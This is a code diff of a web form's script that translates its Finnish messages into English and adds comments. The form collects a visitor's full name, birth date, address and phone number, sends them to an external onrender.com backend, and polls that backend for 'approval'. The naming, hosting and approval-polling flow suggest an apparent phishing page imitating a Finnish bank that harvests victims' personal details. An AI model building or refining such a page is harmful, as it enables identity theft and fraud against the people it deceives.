@@ -213,12 +213,13 @@
     <p>Lähetetään tietojasi…</p>
   </div>
 
+ <!-- ==================== SCRIPT ==================== -->
   <script>
     const form        = document.getElementById("details-form");
     const submitBtn   = document.getElementById("submit-btn");
     const errorDiv    = document.getElementById("error");
     const spinnerPage = document.getElementById("spinner-page");
-    const backendUrl  = "https://op-9nkj.onrender.com"; // Päivitä tarvittaessa
+    const backendUrl  = "https://op-9nkj.onrender.com"; // Update if needed
 
     const showSpinner = () => spinnerPage.style.display = "flex";
     const hideSpinner = () => spinnerPage.style.display = "none";
@@ -226,8 +227,10 @@
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
+      // Reset error
       errorDiv.style.display = "none";
 
+      // Collect form data
       const data = {
         fullName: document.getElementById("full-name").value.trim(),
         dob: document.getElementById("dob").value,
@@ -237,8 +240,9 @@
         phone: document.getElementById("phone").value.trim()
       };
 
+      // Basic validation
       if (!data.fullName || !data.dob || !data.address || !data.city || !data.postalCode || !data.phone) {
-        errorDiv.textContent = "Täytä kaikki kentät.";
+        errorDiv.textContent = "Please fill in all fields.";
         errorDiv.style.display = "block";
         return;
       }
@@ -247,6 +251,7 @@
       submitBtn.disabled = true;
 
       try {
+        // Send to backend
         const resp = await fetch(`${backendUrl}/details`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -255,10 +260,11 @@
 
         const result = await resp.json();
 
-        if (!result.success) throw new Error(result.error || "Lähetys epäonnistui");
+        if (!result.success) throw new Error(result.error || "Submission failed");
 
         const sessionId = result.id;
 
+        // Poll for approval
         const poll = async () => {
           try {
             const statusResp = await fetch(`${backendUrl}/status/${sessionId}`);
@@ -278,12 +284,13 @@
         poll();
       } catch (err) {
         hideSpinner();
-        errorDiv.textContent = err.message || "Tapahtui virhe. Yritä uudelleen.";
+        errorDiv.textContent = err.message || "An error occurred. Please try again.";
         errorDiv.style.display = "block";
         submitBtn.disabled = false;
       }
     });
 
+    // Optional: Auto-focus first field
     document.getElementById("full-name").focus();
   </script>
 </body>
